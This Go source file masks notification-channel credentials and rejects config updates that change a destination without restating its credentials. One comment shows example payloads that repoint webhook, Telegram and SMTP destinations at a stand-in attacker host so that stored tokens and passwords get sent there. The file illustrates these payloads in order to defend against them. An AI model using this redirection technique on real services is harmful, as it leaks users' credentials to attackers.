package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes credentials it
// replaces the real content with a value carrying this prefix, and the update endpoint
// reads a value with this prefix as "keep the stored value unchanged".
//
// A prefix rather than an empty string or a fixed constant, so it can also carry a bit of
// identifying information (see MaskedValue), letting the user tell which bot this is
// without pasting the secret again.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original is too short, give no hint at all
//	"__masked__:…ab12cd"      with the last 6 characters as an identifying hint
//
// Exposing only the last 6 is deliberate: a webhook URL's identifying part is at the end
// (e.g. the WeCom key, the Feishu bot id), while the prefix is identical across bots and
// identifies nothing. Six characters cannot restore the credential but are enough for the
// configurer to recognize "that is my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. echoed by the API and not
// modified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by
// masked values.
//
// An unknown channel kind returns an empty map instead of the original config -- better to
// let the UI show "config unavailable" than to spit back content that may hold credentials
// when the kind cannot be recognized. Non-credential fields are kept as is so the UI can
// still display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures such as headers are masked as one credential as a whole:
		// deciding per sub-key would require every channel to declare another rule for
		// "which sub-keys are credentials", which costs far more than it gains.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed but the caller did
// not state its intent for the credential fields". It is returned instead of silently
// allowing or silently dropping the credentials; see PrepareConfigUpdate for the reasoning.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit statement
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")를 함께 다시 입력하세요: 새 값을 넣거나, 비워 두어 더는 자격 증명이 필요 없음을 표시하세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 사용하면 새 주소에 넘겨주는 셈입니다."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of
// "the destination changed".
//
// It replaces the bare MergeConfig on the channel update path and closes a path that was
// proven to work in practice: destination (where messages go) and credentials (what identity
// sends them) are two independent fields, and MergeConfig keeps the stored value for any key
// not mentioned. So anyone who can PATCH a channel could **change only the address and say
// nothing about the credentials**, making the server send the stored credentials to an
// endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  -> the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> hands over the username and password after STARTTLS
//
// The path is completely silent, needs no redirect (so refusing cross-host redirects does not
// stop it), and directly defeats this package's masking goal -- "credentials are never echoed
// to the browser".
//
// Rule: as soon as a destination key is set to a new value, the caller must explicitly state
// its intent for **every** credential key:
//   - give a new value -> use it
//   - explicitly send an empty string -> the field no longer needs a credential (keeps the
//     clear semantics)
//   - echo the masked value back / omit the key entirely -> reject
//
// The third case is rejected because "masked value" means exactly "reuse the old
// credential", and the old credential only applies to the old address. Silently dropping
// credentials is deliberately not done here: for optional credential fields (webhook headers,
// email password) it would quietly become "auth is gone but the endpoint returns 200", which
// is harder to diagnose than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("등록되지 않은 채널 유형입니다: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. the webhook headers object) contains the mask
	// literal, the caller stuffed the "keep the stored value" sentinel inside a structure.
	// MergeConfig only treats a **string with the prefix** as masked, so this shape would be
	// stored as an ordinary object -- the literal "__masked__" really lands in the database,
	// and later auth silently fails with no error at all. Reject it instead.
	//
	// This check must come **first**: when the address did not change the function returns
	// early, so putting it later would only cover the "address changed" path (the first
	// version got this wrong and the tests caught it immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that really changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: plain merge (masked values keep the stored value, empty strings
		// clear, everything else overrides).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit statement for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting the mask sentinel inside a non-string
// structure.
//
// The masking mechanism assumes "the whole value is one string". An object field like the
// webhook headers can only be masked as a whole (written as the string "__masked__") or
// submitted as a whole; stuffing the sentinel inside the object neither expresses "keep
// unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에 마스킹 표시(%q)가 들어 있습니다. 이 필드는 전체를 비워 두어 기존 값을 유지하거나 전체를 새 값으로 제출해야 하며, 구조체 내부에 마스킹 표시를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization is used
// so type differences are handled along the way -- the frontend submits the port as a
// number while the database reads it back as float64, and a direct == would misjudge that.
//
// "Blank" must be normalized before comparing: an empty string and a missing key are the
// same state in this config model, because MergeConfig treats an empty string as an explicit
// clear and deletes the key. Without normalization an optional destination field that is
// always left empty (Telegram's base_url is the only such field: empty means use the official
// address) would take this path:
//
//	create with base_url:""  ->  the first save has MergeConfig delete the key
//	-> on the second save incoming is "" and stored has no key, judged as "address changed"
//	-> the credential is a masked value -> 400 "destination changed, re-enter the credentials"
//
// After that every save fails unless the user pastes the Bot Token again, having changed
// nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank".
// It must match MergeConfig's clear rule (strings.TrimSpace(s) == ""), otherwise there is a
// gap where MergeConfig thinks the key should be deleted while sameConfigValue sees a value.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - key in incoming with a masked value -> keep the stored value (the user did not change it)
//   - key in incoming with an empty string -> explicit clear, delete the key
//   - any other key -> override with the incoming value
//   - key in stored but not in incoming -> keep (partial update semantics)
//
// Whether an empty string counts as a "clear" needs a decision: the frontend form submits
// unfilled fields as empty strings, and writing that as a value would really wipe a field
// that is meant to stay empty. Explicit clear is chosen here, because there is no other way
// for a user to remove a wrongly set field (pointer presence could distinguish "not provided"
// from "provided empty", but the UI does not use that difference).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
